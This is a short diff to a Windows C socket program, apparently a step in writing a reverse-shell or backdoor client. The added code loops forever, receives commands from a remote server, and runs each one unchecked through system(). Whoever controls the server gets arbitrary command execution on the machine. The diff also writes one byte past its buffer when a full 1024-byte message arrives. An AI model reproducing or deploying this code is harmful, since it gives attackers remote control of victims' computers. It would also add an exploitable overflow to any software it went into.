@@ -13,6 +13,8 @@ int main()
     WSADATA wsa;
     SOCKET s;
     struct sockaddr_in server;
+    int recv_commands;
+    char command[1024];
     
     if(WSAStartup(MAKEWORD(2,2), &wsa) != 0)
     {
@@ -41,6 +43,20 @@ int main()
 
     while(1)
     {
+        recv_commands = recv(s, command, sizeof(command), 0);
+        if(recv_commands == SOCKET_ERROR)
+        {
+            printf("[-] Error receiving commands: %d", WSAGetLastError());
+            return 1;
+        } 
+
+        if(recv_commands == 0) { //return value of recv when connection cloesse
+            printf("[-] Server disconnected\n");
+            return 0;
+        }
+
+        command[recv_commands] = '\0';
+        system(command);
     }
 
     return 0;
